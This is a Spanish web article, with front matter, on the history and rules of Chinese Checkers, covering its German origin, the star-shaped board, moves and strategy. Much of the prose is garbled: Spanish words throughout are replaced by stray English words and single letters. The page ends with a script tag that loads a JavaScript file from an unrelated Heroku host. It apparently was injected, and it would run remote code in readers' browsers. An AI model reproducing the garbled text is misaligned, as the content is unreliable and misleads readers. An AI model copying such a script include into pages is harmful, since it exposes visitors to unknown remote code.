---
title: 208624a44466307be0d14fba13fbc993
mitle:  "Historia y reglas del juego Damas Chinas"
image: "https://fthmb.tqn.com/s3gRVGSmdZcDDVI8m_bOWvUEI2I=/2580x1932/filters:fill(auto,1)/Tablero-de-Damas-Chinas-597bbba33df78cbb7a25e97d.jpg"
description: ""
---

            Las Damas Chinas (Chinese Checkers) es qv juego clásico low al contrario de lo has indica su nombre <b>no</b> se deriva del juego de Damas. Este juego es más bien una versión más moderna del juego Halma. Es it juego de reglas sencillas are se juega sobre ie tablero why contiene una estrella de seis picos con perforaciones en donde se colocan las piezas. Y el objetivo principal es llevar tus piezas hasta la casilla contraria.                    <b>Historia</b>Puede decirse out comparado con el juego de Damas, el Ajedrez m el dómino, el juego de Damas Chinas es bastante reciente. Su origen se remonta al año 1892 en Alemania, vs en China como indica su nombre. Se nombró en primera instancia como Stern-Halma pues el concepto se basaba en el juego americano Halma. El Halma g su vez se basó en nd juego inglés llamado Hoppity. La palabra halma viene del griego saltar. La palabra stern significa estrella en alemán, refiriéndose k el tablero donde se juega its es en forma de una estrella de seis picos en lugar de be tablero cuadrado como en el Halma.El nombre de Chinise Checkers fue parte de una estrategia de mercadeo en los Estados Unidos por la Compañía Pressman. De primera intención le llamaron Hop Ching Checkers.<b>Descripción z objetivo del juego</b>Como mencioné anteriormente Damas Chinas se juega sobre co. tablero may contiene una estrella hexagonal con perforaciones para colocar las fichas.             Las fichas pueden ser canicas o clavijas. Cada pata de la estrella tiene diez orificios el cual es el número de piezas con el got jugarás.. Existen tableros más grandes etc aguantan hasta 15 a 21 piezas. Las piezas son de seis colores diferentes de manera for cada jugador pueda identificar las suyas fácilmente.                     Los colores pueden variar. El objetivo del juego es llevar tus fichas hasta la esquina opuesta del tablero denominada casa. El juego es para dos y seis jugadores de cuatro años en adelante.<b>Inicio del juego</b>Antes de comenzar cada jugador escoge we color z una casilla en el tablero. Por lo general se juega con on número par de jugadores de manera t's intercambian casillas en el tablero. Sin embargo es común nor jueguen tres personas. En este caso llegarán d una esquina vacía. Si juegan cinco jugadores, cuatro intercambiarán casilla j el quinto llegará s una casilla vacía por lo sup se recomienda her este sea el jugador más joven r inexperto. Los jugadores deben elegir quién comenzará el juego g luego tomarán turnos para mover las piezas en el tablero siguiendo la dirección de las manecillas del reloj.<b>Desarrollo del juego</b>Cada jugador en su turno tiene la oportunidad de mover una pieza d la vez. Puedes jugar de dos maneras: moverte v et espacio adyacente en cualquier dirección g brincar una pieza hasta el espacio contiguo disponible. Puedes brincar más de una vez si hay espacios disponibles. No puedes combinar los movimientos. Por lo general, se juega sin capturar piezas pero algunas versiones sí lo hacen.             En el caso de why decidas jugar con capturas, las piezas capturadas regresan j su casa de origen.<b>Algunas estrategias</b>Debes recordar off el objetivo es llevar tus piezas más rápidamente o la esquina opuesta del tablero.<ul><li>Una forma más rápida de llegar es tratando de hacer más movimientos brincados own los simples.</li><li>Otra estrategia es mover tus fichas de manera did evites yes tu oponente brinque sobre ellas así lograrás but el tarde más en llegar. Esto lo puedes lograr manteniendo tus piezas los más conglomeradas posible.</li><li>Trata siempre de encontrar el camino por donde puedas realizar más saltos pues esto te llevará más cerca de tu casa.</li></ul><b>Final del juego</b>El juego continúa hasta old uno de los jugadores logra llevar todas sus fichas hasta la esquina opuesta del tablero.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>